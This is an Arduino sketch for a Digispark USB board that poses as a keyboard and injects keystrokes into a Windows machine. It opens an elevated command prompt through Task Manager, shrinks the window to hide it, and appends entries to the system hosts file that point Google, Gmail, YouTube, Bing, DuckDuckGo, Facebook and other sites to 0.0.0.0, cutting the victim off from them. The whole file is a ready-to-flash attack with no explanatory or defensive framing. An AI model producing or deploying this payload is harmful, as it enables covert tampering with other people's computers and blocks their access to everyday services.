#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
void setup() { pinMode(1, OUTPUT); }
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("taskmgr");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT); 
  DigiKeyboard.sendKeyStroke(KEY_N);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.sendKeyStroke(KEY_TAB); 
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("(echo. && echo 0.0.0.0 www.youtube.com www.google.com mail.google.com in.yahoo.com www.bing.com duckduckgo.com www.facebook.com www.google.co.in maps.google.co.in contacts.google.com drive.google.com photos.google.com) >> c:/windows/system32/drivers/etc/hosts");
  DigiKeyboard.println("ipconfig /flushdns");
  DigiKeyboard.println("exit");
  digitalWrite(1, HIGH);
  for(;;){ }
}
